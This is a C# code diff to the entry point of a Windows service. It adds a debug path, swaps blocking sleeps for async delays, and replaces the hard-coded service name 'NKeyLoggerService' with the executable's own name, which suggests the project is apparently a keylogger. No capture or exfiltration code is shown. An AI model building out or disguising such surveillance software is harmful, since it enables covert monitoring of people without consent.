@@ -13,6 +13,11 @@ class Program
 {
     public static async Task Main(string[] args)
     {
+#if DEBUG
+        ServiceWorker worker = new ServiceWorker();
+        CancellationTokenSource cts = new CancellationTokenSource(); 
+        await worker.StartAsync(cts.Token);
+#else
         string serviceName = System.AppDomain.CurrentDomain.FriendlyName;
 
         if (args.Length == 0)
@@ -41,9 +46,10 @@ class Program
                 Log<Program>.Instance.logger?.LogError(writeResult.Error);
                 return;
             }
-            Thread.Sleep(2000);
+            await Task.Delay(2000);
             Console.WriteLine(cmd.Readed);
-            Thread.Sleep(5000);
+            await Task.Delay(5000);
+            cmd.Dispose();
         }
         else
         {
@@ -52,7 +58,7 @@ class Program
             IHost host = Host.CreateDefaultBuilder(args)
             .UseWindowsService(options =>
             {
-                options.ServiceName = "NKeyLoggerService";
+                options.ServiceName = serviceName;
             })
             .ConfigureServices(services =>
             {
@@ -60,5 +66,6 @@ class Program
             }).Build();
             await host.RunAsync();
         }
+#endif
     }
 }
